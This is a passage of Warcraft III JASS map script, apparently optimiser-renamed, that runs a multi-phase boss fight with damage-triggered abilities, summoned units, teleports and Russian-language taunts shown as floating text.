call DestroyGroup(Mc)
set No=null
set Mc=null
elseif GetRandomInt(1,1)==1 then
call UnitAddAbility(Hu,$41313947)
call SetUnitAbilityLevel(Hu,$41313947,3)
call EnableTrigger(gZ)
call nh(Hu,"|c00ff00ffВаши амбиции - ничто",.03,255,255,255)
call SetUnitVertexColor(Hu,255,0,255,100)
endif
call TriggerSleepAction(8)
call DisableTrigger(gZ)
call nh(Hu,"|c00ffff00Ладно, проехали.",.03,255,255,255)
call SetUnitVertexColor(Hu,255,255,255,255)
endif
call EnableTrigger(GetTriggeringTrigger())
endif
set Hu=null
endfunction
function Bq1 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer Mc
if GetUnitLifePercent(Hu)<=I2R(UQ[2]) and GetUnitAbilityLevel(Hu,$41304452)==3 then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(Hu,I2R(UQ[2]))
set UQ[2]=UQ[2]-15
call SetUnitOwner(Hu,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Hu,true)
call nh(Hu,"|c00ff6969Смотрите, птички!!",.03,255,255,255)
call SetUnitPositionLoc(Hu,Location(14093.,-23219.))
call TriggerSleepAction(2)
set Mc=0
loop
if RectContainsUnit(B7,MT[Mc]) then
set gY[Mc]=CreateUnitAtLoc(Player(Mc),$6E303442,GetUnitLoc(MT[Mc]),GetRandomReal(31.,329.))
endif
set Mc=Mc+1
exitwhen Mc==8
endloop
call TriggerSleepAction(2)
set Mc=0
loop
if RectContainsUnit(B7,MT[Mc]) then
if GetUnitFacing(MT[Mc])>=GetUnitFacing(gY[Mc])-30. and GetUnitFacing(MT[Mc])<=GetUnitFacing(gY[Mc])+30. then
call RemoveUnit(gY[Mc])
else
call KillUnit(MT[Mc])
call RemoveUnit(gY[Mc])
endif
endif
set Mc=Mc+1
exitwhen Mc==8
endloop
call SetUnitOwner(Hu,Player(11),true)
call SetUnitInvulnerable(Hu,false)
call EnableTrigger(GetTriggeringTrigger())
endif
set Hu=null
endfunction
function Bq2 takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bq1)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bq0)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bqz)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bqy)
set Hc=null
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function Bqx)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterLeaveRectSimple(Hc,B7)
call TriggerAddAction(Hc,function Bqo)
set Hc=null
set gZ=CreateTrigger()
call DisableTrigger(gZ)
call TriggerRegisterAnyUnitEventBJ(gZ,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerRegisterAnyUnitEventBJ(gZ,EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER)
call TriggerAddAction(gZ,function Bqq)
endfunction
function Bq3 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bq4 takes nothing returns boolean
if not (GetOwningPlayer(Ly)==Player(11)) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bq5 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(30.)
if Bq4() then
set SR=GetUnitsInRectMatching(D6,Condition(function Bq3))
set V0=GetUnitLoc(GroupPickRandomUnit(SR))
call SetUnitPositionLoc(Ly,V0)
call CreateTextTagUnitBJ("А вот и я!
",Ly,0,30.,0.,100.,100.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call DestroyGroup(SR)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call IssueImmediateOrder(GetTriggerUnit(),"fanofknives")
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bq6 takes nothing returns nothing
set gb=CreateTrigger()
call TriggerRegisterUnitEvent(gb,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gb,function Bq5)
endfunction
function Bq7 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bq8 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bq9 takes nothing returns boolean
if not (GetOwningPlayer(Ly)==Player(11)) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BrB takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
if Bq9() then
call CreateTextTagUnitBJ("Ваши кости - прах!",Ly,0,30.,100.,0.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set V0=GetRandomLocInRect(D6)
set SR=GetUnitsInRectMatching(D6,Condition(function Bq7))
call CreateNUnitsAtLoc(1,$65303052,Player(10),V0,bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"move",GroupPickRandomUnit(SR))
call DestroyGroup(SR)
call RemoveLocation(V0)
call TriggerSleepAction(15.)
set SR=GetUnitsOfTypeIdAll($65303052)
call ForGroupBJ(SR,function Bq8)
call DestroyGroup(SR)
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BrC takes nothing returns nothing
set gc=CreateTrigger()
call TriggerRegisterUnitEvent(gc,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gc,function BrB)
endfunction
function BrD takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BrE takes nothing returns boolean
if not (GetOwningPlayer(Ly)==Player(11)) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BrF takes nothing returns nothing
if BrE() then
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("А вот и они",Ly,0,30.,0.,100.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set V0=GetRandomLocInRect(D6)
call CreateNUnitsAtLoc(1,$6E30354C,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
set V0=GetRandomLocInRect(D6)
call CreateNUnitsAtLoc(1,$6E30354C,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
set V0=GetRandomLocInRect(D6)
call CreateNUnitsAtLoc(1,$6E30354C,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
call TriggerSleepAction(15.)
set SR=GetUnitsOfTypeIdAll($6E30354C)
call ForGroupBJ(SR,function BrD)
call DestroyGroup(SR)
call TriggerSleepAction(45.)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BrG takes nothing returns nothing
set gd=CreateTrigger()
call TriggerRegisterUnitEvent(gd,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gd,function BrF)
endfunction
function BrH takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E30354C) then
return false
endif
return true
endfunction
function BrI takes nothing returns nothing
call SetUnitLifePercentBJ(Ly,GetUnitLifePercent(Ly)+15.)
call UnitDamageTargetBJ(GetTriggerUnit(),GetKillingUnitBJ(),10000.,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call CreateTextTagUnitBJ("+15%",Ly,0,30.,100.,0.,100.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endfunction
function BrJ takes nothing returns nothing
set ge=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ge,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(ge,Condition(function BrH))
call TriggerAddAction(ge,function BrI)
endfunction
function BrK takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BrL takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BrM takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303547
endfunction
function BrN takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BrO takes nothing returns boolean
return GetBooleanAnd(BrM(),BrN())
endfunction
function BrP takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BrQ takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41313452)==2) then
return false
endif
return true
endfunction
function BrR takes nothing returns boolean
if not (GetUnitLifePercent(Jq)>=99.) then
return false
endif
return true
endfunction
function BrS takes nothing returns boolean
if not (GetOwningPlayer(Ly)==Player(11)) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[1])) then
return false
endif
return true
endfunction
function BrT takes nothing returns nothing
if BrS() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[1]))
set TS[1]=TS[1]-35
call CreateTextTagUnitBJ("Духовное Око",Ly,0,30.,100.,100.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call ShowUnit(Jq,true)
call SetUnitOwner(Jq,Player(8),true)
call SetUnitLifePercentBJ(Jq,5.)
call TriggerSleepAction(10.)
if BrR() then
call ShowUnit(Jq,false)
call SetUnitOwner(Jq,Player(PLAYER_NEUTRAL_PASSIVE),true)
call CreateTextTagUnitBJ("Исцелили? Ну-ну",Ly,0,30.,0.,100.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
call CreateTextTagUnitBJ("АХА-ХА-ХА",Ly,0,30.,100.,0.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call ShowUnit(Jq,false)
call SetUnitOwner(Jq,Player(PLAYER_NEUTRAL_PASSIVE),true)
set SR=GetUnitsInRectMatching(D6,Condition(function BrK))
call ForGroupBJ(SR,function BrL)
call DestroyGroup(SR)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
set TS[1]=80
set TS[2]=75
set TS[3]=10
set TS[4]=95
set TS[5]=90
set V0=GetRectCenter(D6)
call SetUnitPositionLocFacingBJ(Ly,V0,270.)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
set SR=GetUnitsInRectMatching(D6,Condition(function BrO))
call ForGroupBJ(SR,function BrP)
call DestroyGroup(SR)
if BrQ() then
call EnableTrigger(eD)
call EnableTrigger(eE)
call EnableTrigger(eF)
else
endif
endif
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BrU takes nothing returns nothing
set gf=CreateTrigger()
call TriggerRegisterUnitEvent(gf,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gf,function BrT)
endfunction
function BrV takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[4])) then
return false
endif
return true
endfunction
function BrW takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BrX takes nothing returns boolean
if not (UnitHasBuffBJ(Wi[200],$4230344B)==true) then
return false
endif
return true
endfunction
function BrY takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BrZ takes nothing returns boolean
if not (GetOwningPlayer(Ly)==Player(11)) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bra takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[4]))
set TS[4]=TS[4]-5
if BrZ() then
set SR=GetUnitsInRectMatching(D6,Condition(function BrW))
set Wi[200]=GroupPickRandomUnit(SR)
set V0=GetUnitLoc(Wi[200])
call CreateNUnitsAtLoc(1,$68303146,Player(10),V0,bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"magicleash",Wi[200])
call RemoveLocation(V0)
call DestroyGroup(SR)
call TriggerSleepAction(5.)
if BrX() then
call KillUnit(Wi[200])
set Wi[200]=null
else
endif
set SR=GetUnitsOfTypeIdAll($68303146)
call ForGroupBJ(SR,function BrY)
call DestroyGroup(SR)
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Brb takes nothing returns nothing
set gg=CreateTrigger()
call TriggerRegisterUnitEvent(gg,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(gg,Condition(function BrV))
call TriggerAddAction(gg,function Bra)
endfunction
function Brc takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[2])) then
return false
endif
return true
endfunction
function Brd takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bre takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnumUnit()),V0,0)
endfunction
function Brf takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnumUnit()),V0,0)
endfunction
function Brg takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("Прыжок в яму!",Ly,0,30.,100.,0.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call TriggerSleepAction(2)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[2]))
set TS[2]=TS[2]-25
call SetUnitOwner(Ly,Player(10),true)
call UnitAddAbilityBJ($41305353,Ly)
set SR=GetUnitsInRectMatching(D6,Condition(function Brd))
set V0=GetRectCenter(ED)
call ForGroupBJ(SR,function Bre)
call SetUnitPositionLoc(Ly,V0)
call DestroyGroup(SR)
call RemoveLocation(V0)
call TriggerSleepAction(15.)
set V0=GetRectCenter(D6)
call ForGroupBJ(GetUnitsInRectAll(ED),function Brf)
call RemoveLocation(V0)
call SetUnitOwner(Ly,Player(11),true)
call UnitRemoveAbilityBJ($41305353,Ly)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Brh takes nothing returns nothing
set gh=CreateTrigger()
call TriggerRegisterUnitEvent(gh,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(gh,Condition(function Brc))
call TriggerAddAction(gh,function Brg)
endfunction
function Bri takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[3])) then
return false
endif
return true
endfunction
function Brj takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Brk takes nothing returns boolean
if GetOwningPlayer(Ly)==Player(11) then
return true
endif
if GetOwningPlayer(Ly)==Player(10) then
return true
endif
return false
endfunction
function Brl takes nothing returns boolean
if not Brk() then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Brm takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[3]))
set TS[3]=0
if Brl() then
set V0=GetRectCenter(D6)
call CreateNUnitsAtLoc(1,$68303157,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
call TriggerSleepAction(5.)
set SR=GetUnitsOfTypeIdAll($68303157)
call ForGroupBJ(SR,function Brj)
call DestroyGroup(SR)
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Brn takes nothing returns nothing
set gi=CreateTrigger()
call TriggerRegisterUnitEvent(gi,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(gi,Condition(function Bri))
call TriggerAddAction(gi,function Brm)
endfunction
function Bro takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=70.) then
return false
endif
return true
endfunction
function Brp takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),70.)
call ShowUnit(GetTriggerUnit(),false)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
call SetUnitPositionLoc(Ly,GetRectCenter(ED))
set Wi[21]=CreateUnitAtLoc(Player(11),$6E30364C,GetRectCenter(D6),270.)
set TS[6]=95
set TS[7]=75
set TS[8]=90
set TS[9]=85
set TS[10]=70
endfunction
function Brq takes nothing returns nothing
set eD=CreateTrigger()
call DisableTrigger(eD)
call TriggerRegisterUnitEvent(eD,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(eD,Condition(function Bro))
call TriggerAddAction(eD,function Brp)
endfunction
function Brr takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30364C then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364D then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364E then
return true
endif
return false
endfunction
function Brs takes nothing returns boolean
if not Brr() then
return false
endif
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[6])) then
return false
endif
return true
endfunction
function Brt takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bru takes nothing returns nothing
call SetUnitLifePercentBJ(GetEnumUnit(),5.)
call SetUnitManaBJ(GetEnumUnit(),1000.)
endfunction
function Brv takes nothing returns nothing
local location Ht
local unit NQ
call DisableTrigger(GetTriggeringTrigger())
call nh(GetTriggerUnit(),"|c00ff9696Успеете?",.03,255,255,255)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[6]))
set TS[6]=TS[6]-15
set SR=GetUnitsInRectMatching(D6,Condition(function Brt))
call ForGroupBJ(SR,function Bru)
call DestroyGroup(SR)
set Ht=GetRandomLocInRect(F0)
set NQ=CreateUnitAtLoc(Player(10),$68303430,Ht,0)
call SetUnitAbilityLevel(NQ,$41303057,2)
call nD(NQ,5)
call PauseUnit(NQ,true)
call TriggerSleepAction(1.5)
call PauseUnit(NQ,false)
call IssuePointOrderLoc(NQ,"rainoffire",Ht)
call RemoveLocation(Ht)
call EnableTrigger(GetTriggeringTrigger())
set NQ=null
set Ht=null
endfunction
function Brw takes nothing returns nothing
set gj=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gj,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(gj,Condition(function Brs))
call TriggerAddAction(gj,function Brv)
endfunction
function Brx takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30364C then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364D then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364E then
return true
endif
return false
endfunction
function Bry takes nothing returns boolean
if not Brx() then
return false
endif
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[7])) then
return false
endif
return true
endfunction
function Brz takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Br0 takes nothing returns nothing
call KillUnit(GetEnumUnit())
call SetUnitLifePercentBJ(GetTriggerUnit(),100.)
set TS[6]=95
set TS[7]=75
set TS[8]=90
set TS[9]=85
set TS[10]=70
set TS[11]=90
endfunction
function Br1 takes nothing returns boolean
if not (RectContainsUnit(RectFromCenterSizeBJ(Vz,500.,500.),GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Br2 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagLocBJ("Смерть уже близко!",GetUnitLoc(GetTriggerUnit()),0,13.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[7]))
set TS[7]=TS[7]-30
set Vz=GetRandomLocInRect(F0)
set Wi[31]=CreateUnitAtLoc(Player(10),$68303335,Vz,270.)
call UnitApplyTimedLifeBJ(5.,$42544C46,Wi[31])
call RemoveLocation(Vz)
call TriggerSleepAction(4.)
set Vz=GetUnitLoc(Wi[31])
if Br1() then
else
set SR=GetUnitsInRectMatching(D6,Condition(function Brz))
call ForGroupBJ(SR,function Br0)
call DestroyGroup(SR)
endif
call RemoveLocation(Vz)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Br3 takes nothing returns nothing
set gk=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gk,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(gk,Condition(function Bry))
call TriggerAddAction(gk,function Br2)
endfunction
function Br4 takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30364C then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364D then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364E then
return true
endif
return false
endfunction
function Br5 takes nothing returns boolean
if not Br4() then
return false
endif
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[8])) then
return false
endif
return true
endfunction
function Br6 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Br7 takes nothing returns boolean
if not (RectContainsUnit(RectFromCenterSizeBJ(Vz,650.,650.),GetEnumUnit())==true) then
return false
endif
return true
endfunction
function Br8 takes nothing returns nothing
if Br7() then
else
call KillUnit(GetEnumUnit())
endif
endfunction
function Br9 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagLocBJ("Сила - в единстве!",GetUnitLoc(GetTriggerUnit()),0,13.,100,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[8]))
set TS[8]=TS[8]-30
set Vz=GetRandomLocInRect(F0)
set Wi[32]=CreateUnitAtLoc(Player(10),$68303558,Vz,0.)
call UnitApplyTimedLifeBJ(5.,$42544C46,Wi[32])
call RemoveLocation(Vz)
call TriggerSleepAction(4.)
set Vz=GetUnitLoc(Wi[32])
set SR=GetUnitsInRectMatching(D6,Condition(function Br6))
call ForGroupBJ(SR,function Br8)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BsB takes nothing returns nothing
set gl=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gl,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(gl,Condition(function Br5))
call TriggerAddAction(gl,function Br9)
endfunction
function BsC takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=40.) then
return false
endif
return true
endfunction
function BsD takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),40.)
call ShowUnit(GetTriggerUnit(),false)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
call SetUnitPositionLoc(Ly,GetRectCenter(ED))
set Wi[22]=CreateUnitAtLoc(Player(11),$6E30364D,GetRectCenter(D6),270.)
set TS[6]=95
set TS[7]=75
set TS[8]=90
set TS[9]=85
set TS[10]=70
endfunction
function BsE takes nothing returns nothing
set eE=CreateTrigger()
call DisableTrigger(eE)
call TriggerRegisterUnitEvent(eE,Ly,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(eE,Condition(function BsC))
call TriggerAddAction(eE,function BsD)
endfunction
function BsF takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30364E then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364D then
return true
endif
return false
endfunction
function BsG takes nothing returns boolean
if not BsF() then
return false
endif
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[9])) then
return false
endif
return true
endfunction
function BsH takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagLocBJ("Помощь уже тут!",GetUnitLoc(GetTriggerUnit()),0,12.,100.,50.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[9]))
set TS[9]=TS[9]-40
set Vz=GetRandomLocInRect(F0)
set Wi[33]=CreateUnitAtLoc(Player(10),$6830355A,Vz,270.)
call UnitApplyTimedLifeBJ(15.,$42544C46,Wi[33])
call PauseUnit(Wi[33],true)
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(F0)
set Wi[34]=CreateUnitAtLoc(Player(10),$68303559,Vz,270.)
call UnitApplyTimedLifeBJ(15.,$42544C46,Wi[34])
call PauseUnit(Wi[34],true)
call RemoveLocation(Vz)
call TriggerSleepAction(6.)
call PauseUnit(Wi[33],false)
call PauseUnit(Wi[34],false)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BsI takes nothing returns nothing
set gm=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gm,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(gm,Condition(function BsG))
call TriggerAddAction(gm,function BsH)
endfunction
function BsJ takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E30364E then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E30364D then
return true
endif
return false
endfunction
function BsK takes nothing returns boolean
if not BsJ() then
return false
endif
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TS[10])) then
return false
endif
return true
endfunction
function BsL takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagLocBJ("Иллюзия",GetUnitLoc(GetTriggerUnit()),0,15.,50.,50.,50.,50.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TS[10]))
set TS[10]=TS[10]-30
set Vz=GetRandomLocInRect(F0)
set Wi[35]=CreateUnitAtLoc(Player(10),$6E303836,Vz,270.)
call UnitApplyTimedLifeBJ(12.,$42544C46,Wi[35])
call SetUnitVertexColor(Wi[35],255,255,255,120)
call RemoveLocation(Vz)
call TriggerSleepAction(10.)
set Vz=GetUnitLoc(Wi[35])
call SetUnitPositionLoc(GetTriggerUnit(),Vz)
call RemoveUnit(Wi[35])
call RemoveLocation(Vz)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BsM takes nothing returns nothing
set gn=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(gn,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(gn,Condition(function BsK))
call TriggerAddAction(gn,function BsL)
endfunction
function BsN takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=15.) then
return false
endif
return true
endfunction
function BsO takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),15.)
call ShowUnit(GetTriggerUnit(),false)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
call SetUnitPositionLoc(Ly,GetRectCenter(ED))
set Wi[22]=CreateUnitAtLoc(Player(11),$6E30364E,GetRectCenter(D6),270.)
set TS[6]=95
set TS[7]=75
set TS[8]=90
set TS[9]=85
set TS[10]=70
set TS[11]=90
endfunction
function BsP takes nothing returns nothing
set eF=CreateTrigger()
call DisableTrigger(eF)
call TriggerRegisterUnitEvent(eF,Ly,EVENT_UNIT_DAMAGED)
